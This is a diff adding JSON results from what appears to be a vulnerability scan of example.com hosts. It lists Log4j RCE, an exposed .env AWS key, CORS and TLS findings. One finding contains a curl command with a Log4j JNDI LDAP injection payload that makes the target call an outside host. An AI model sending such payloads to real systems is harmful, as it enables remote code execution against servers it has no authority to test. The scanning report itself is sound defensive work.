@@ -1,0 +1,51 @@
+[
+  {
+    "template-id": "cve-2021-44228",
+    "info": {
+      "name": "Apache Log4j2 - Remote Code Execution",
+      "severity": "critical",
+      "tags": ["cve", "cve2021", "rce", "log4j"]
+    },
+    "type": "http",
+    "host": "payment.example.com",
+    "matched-at": "https://payment.example.com/api/v1/checkout",
+    "curl-command": "curl -X POST -H 'X-Api-Version: ${jndi:ldap://test.oast.me/a}' https://payment.example.com/api/v1/checkout",
+    "extracted-results": ["DNS OAST Interaction Received: test.oast.me"]
+  },
+  {
+    "template-id": "aws-env-exposure",
+    "info": {
+      "name": "Exposed Environment File (.env) with AWS Keys",
+      "severity": "critical",
+      "tags": ["exposure", "config", "aws"]
+    },
+    "type": "http",
+    "host": "admin.example.com",
+    "matched-at": "https://admin.example.com/.env",
+    "extracted-results": ["AKIAIOSFODNN7EXAMPLE"]
+  },
+  {
+    "template-id": "cors-misconfig-any-origin",
+    "info": {
+      "name": "CORS Misconfiguration - Any Origin Allowed",
+      "severity": "medium",
+      "tags": ["misconfig", "cors"]
+    },
+    "type": "http",
+    "host": "api.example.com",
+    "matched-at": "https://api.example.com/v1/data",
+    "extracted-results": []
+  },
+  {
+    "template-id": "ssl-tls-version",
+    "info": {
+      "name": "TLS 1.0 Enabled",
+      "severity": "low",
+      "tags": ["ssl", "tls", "weak"]
+    },
+    "type": "ssl",
+    "host": "example.com",
+    "matched-at": "https://example.com:443",
+    "extracted-results": []
+  }
+]
